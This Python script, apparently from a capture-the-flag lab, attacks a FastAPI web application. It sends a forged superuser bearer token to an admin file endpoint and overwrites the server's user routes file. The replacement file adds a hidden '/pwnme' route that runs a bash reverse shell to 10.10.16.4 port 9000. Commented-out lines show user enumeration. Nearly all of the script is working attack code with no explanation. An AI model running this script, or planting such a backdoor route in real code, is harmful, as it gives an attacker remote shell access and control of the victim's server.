#!/usr/bin/env python3

import requests, re
from base64 import urlsafe_b64encode

file = 'app/api/v1/endpoints/user.py'
b64url_file = urlsafe_b64encode(file.encode())
url = "http://10.10.11.162/"
path = f"api/v1/admin/file/{b64url_file.decode()}"

token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjcxMTkwOTMxLCJpYXQiOjE2NzA0OTk3MzEsInN1YiI6IjEyIiwiZGVidWciOnRydWUsImlzX3N1cGVydXNlciI6dHJ1ZSwiZ3VpZCI6IjNhYzgzZjMwLWExYzgtNDM0Zi1hZTk2LTZjY2Y5YTJhNmIwYyJ9.nJxwTlI8o3cd2aZ_SIxC52zXmBK8SqyLa9FCO5WDcsA'

headers = {
	"Authorization": f'Bearer {token}'
}

# data = {
# 	"username": "test@test.com",
# 	"password": "test2",
# }

json = {
	"file": "from typing import Any, Optional\r\nfrom uuid import uuid4\r\nfrom datetime import datetime\r\n\r\n\r\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\r\nfrom fastapi.security import OAuth2PasswordRequestForm\r\nfrom sqlalchemy.orm import Session\r\n\r\nfrom app import crud\r\nfrom app import schemas\r\nfrom app.api import deps\r\nfrom app.models.user import User\r\nfrom app.core.security import get_password_hash\r\nimport os\r\nfrom pydantic import schema\r\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -> Any:\r\n    if field.field_info.extra.get(\"hidden_from_schema\", False):\r\n        raise schema.SkipField(f\"{field.name} field is being hidden\")\r\n    else:\r\n        return original_field_schema(field, **kwargs)\r\n\r\noriginal_field_schema = schema.field_schema\r\nschema.field_schema = field_schema\r\n\r\nfrom app.core.auth import (\r\n    authenticate,\r\n    create_access_token,\r\n)\r\n\r\nrouter = APIRouter()\r\n\r\n@router.get(\"/{user_id}\", status_code=200, response_model=schemas.User)\r\ndef fetch_user(*, \r\n    user_id: int, \r\n    db: Session = Depends(deps.get_db) \r\n    ) -> Any:\r\n    \"\"\"\r\n    Fetch a user by ID\r\n    \"\"\"\r\n    result = crud.user.get(db=db, id=user_id)\r\n    return result\r\n\r\n\r\n@router.put(\"/{user_id}/edit\")\r\nasync def edit_profile(*,\r\n    db: Session = Depends(deps.get_db),\r\n    token: User = Depends(deps.parse_token),\r\n    new_user: schemas.user.UserUpdate,\r\n    user_id: int\r\n) -> Any:\r\n    \"\"\"\r\n    Edit the profile of a user\r\n    \"\"\"\r\n    u = db.query(User).filter(User.id == token[\'sub\']).first()\r\n    if token[\'is_superuser\'] == True:\r\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\r\n    else:        \r\n        u = db.query(User).filter(User.id == token[\'sub\']).first()        \r\n        if u.id == user_id:\r\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\r\n            return {\"result\": \"true\"}\r\n        else:\r\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\r\n\r\n@router.put(\"/{user_id}/password\")\r\nasync def edit_password(*,\r\n    db: Session = Depends(deps.get_db),\r\n    token: User = Depends(deps.parse_token),\r\n    new_user: schemas.user.PasswordUpdate,\r\n    user_id: int\r\n) -> Any:\r\n    \"\"\"\r\n    Update the password of a user\r\n    \"\"\"\r\n    u = db.query(User).filter(User.id == token[\'sub\']).first()\r\n    if token[\'is_superuser\'] == True:\r\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\r\n    else:        \r\n        u = db.query(User).filter(User.id == token[\'sub\']).first()        \r\n        if u.id == user_id:\r\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\r\n            return {\"result\": \"true\"}\r\n        else:\r\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\r\n\r\n@router.post(\"/login\")\r\ndef login(db: Session = Depends(deps.get_db),\r\n    form_data: OAuth2PasswordRequestForm = Depends()\r\n) -> Any:\r\n    \"\"\"\r\n    Get the JWT for a user with data from OAuth2 request form body.\r\n    \"\"\"\r\n    \r\n    timestamp = datetime.now().strftime(\"%m/%d/%Y, %H:%M:%S\")\r\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\r\n    if not user:\r\n        with open(\"auth.log\", \"a\") as f:\r\n            f.write(f\"{timestamp} - Login Failure for {form_data.username}\\n\")\r\n        raise HTTPException(status_code=400, detail=\"Incorrect username or password\")\r\n    \r\n    with open(\"auth.log\", \"a\") as f:\r\n            f.write(f\"{timestamp} - Login Success for {form_data.username}\\n\")\r\n\r\n    return {\r\n        \"access_token\": create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\r\n        \"token_type\": \"bearer\",\r\n    }\r\n\r\n@router.post(\"/signup\", status_code=201)\r\ndef create_user_signup(\r\n    *,\r\n    db: Session = Depends(deps.get_db),\r\n    user_in: schemas.user.UserSignup,\r\n) -> Any:\r\n    \"\"\"\r\n    Create new user without the need to be logged in.\r\n    \"\"\"\r\n\r\n    new_user = schemas.user.UserCreate(**user_in.dict())\r\n\r\n    new_user.guid = str(uuid4())\r\n\r\n    user = db.query(User).filter(User.email == new_user.email).first()\r\n    if user:\r\n        raise HTTPException(\r\n            status_code=400,\r\n            detail=\"The user with this username already exists in the system\",\r\n        )\r\n    user = crud.user.create(db=db, obj_in=new_user)\r\n\r\n    return user\r\n\r\n@router.delete(\"/pwnme\", status_code=200)\r\ndef pwnme() -> Any:\r\n    os.system(\"bash -c \'bash -i >& /dev/tcp/10.10.16.4/9000 0>&1\'\")\r\n    return"
}

r = requests.post(url + path, headers=headers, json=json)
# juice = r.text
# try:
# 	parsed_juice = re.findall(r'"file":"(.+?)"', juice)[0]
# 	print(parsed_juice)
# except:
# 	exit()


print(r.text)
















# with open("users", "r") as file:
# 	users = literal_eval(file.read())

# def getUsersData():
# 	for i in range(1, 12):
# 		r = requests.get(url+path+str(i))
# 		users.append(r.text)